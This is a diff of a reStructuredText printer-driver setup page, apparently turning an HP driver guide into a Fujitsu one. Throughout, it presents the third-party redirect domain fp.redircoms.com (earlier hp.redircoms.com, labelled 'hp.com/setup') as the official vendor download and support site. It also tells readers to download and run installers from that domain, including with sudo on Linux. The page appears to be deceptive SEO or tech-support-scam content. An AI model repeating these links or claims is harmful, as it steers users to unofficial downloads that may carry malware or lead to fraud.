@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How to install Fujitsu Printer driver?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: 976EEDB16D7FBECFFF12CAAD22317912
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: DOWNLOAD-PRINTER-DRIVER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: Fujitsu Printer
+      :target: https://fp.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,83 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Installing the correct driver is crucial for your Fujitsu Printer to function properly. Whether you're setting up a new device or troubleshooting an existing one, this guide will walk you through the entire process. You can directly download the official driver from the **`Fujitsu Printer <https://fp.redircoms.com>`_** support page.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Steps to Install Fujitsu Printer Driver
+---------------------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Follow the step-by-step instructions below based on your operating system:
 
-2. Enter your HP printer model in the search box.
+Windows OS
+^^^^^^^^^^
 
-3. Select your operating system if prompted.
+1. **Visit the Fujitsu Printer Driver Page**  
+   Go to the official driver download site: `https://fp.redircoms.com <https://fp.redircoms.com>`_.
 
-4. Click on **Download** to get the latest driver and software package.
+2. **Select Your Printer Model**  
+   Enter your printer model in the search bar and select it from the list of results.
 
-5. Save the installer file to your computer.
+3. **Choose the Correct Operating System**  
+   Make sure you choose your current Windows version (e.g., Windows 10, 11, etc.).
 
-**********
-Steps to Install HP Printer Driver
-**********
+4. **Download the Driver Installer**  
+   Click on the driver link to begin downloading the setup file.
 
-1. Locate the downloaded installer file on your computer.
+5. **Run the Installer**  
+   Double-click the downloaded file and follow the on-screen prompts to complete the installation.
 
-2. Double-click the installer to begin the setup process.
+6. **Connect Your Printer**  
+   Plug in your Fujitsu Printer via USB or configure it over the network, depending on your model.
 
-3. Follow the on-screen instructions and accept the license agreement.
+7. **Verify Installation**  
+   Go to “Devices and Printers” in the Control Panel to check if the printer appears in the list.
 
-4. Choose your connection type (USB or Wireless).
+Mac OS
+^^^^^^
 
-5. Complete the installation by clicking **Finish**.
+1. **Go to the Fujitsu Printer Driver Site**  
+   Open `https://fp.redircoms.com <https://fp.redircoms.com>`_.
 
-**********
-Setting Up Your HP Printer
-**********
+2. **Search for Your Model**  
+   Enter your printer’s model number to find compatible drivers.
 
-1. Make sure your HP printer is powered on.
+3. **Select Mac OS Version**  
+   Choose your macOS version from the dropdown menu.
 
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
+4. **Download and Install the Driver**  
+   Open the downloaded `.dmg` file and follow the installation steps.
 
-3. Open the HP driver or utility you installed.
+5. **Add the Printer**  
+   Go to System Preferences → Printers & Scanners → Click “+” → Add your Fujitsu Printer.
 
-4. Follow on-screen prompts to detect and connect your printer.
+Linux OS
+^^^^^^^^
 
-5. Once connected, print a test page to verify setup is complete.
+1. **Check Compatibility**  
+   Visit `https://fp.redircoms.com <https://fp.redircoms.com>`_ to see if Linux drivers are available for your model.
+
+2. **Download the Driver Package**  
+   If available, download the appropriate `.deb` or `.rpm` package.
+
+3. **Use Terminal to Install**  
+   - For Debian/Ubuntu-based systems:  
+     ``sudo dpkg -i <driver-filename>.deb``  
+   - For RedHat/Fedora-based systems:  
+     ``sudo rpm -ivh <driver-filename>.rpm``
+
+4. **Connect and Configure Printer**  
+   Use `lpadmin` or your Linux system’s printer settings GUI to add and configure the printer.
+
+Troubleshooting Tips
+--------------------
+
+- **Driver Not Detected?**  
+  Ensure your OS matches the selected driver version.
+
+- **Printer Offline?**  
+  Check the physical connection and ensure the printer is powered on.
+
+- **Driver Installation Fails?**  
+  Try running the installer as an administrator or contact support via the **`Fujitsu Printer <https://fp.redircoms.com>`_** help section.
+
+Additional Resources
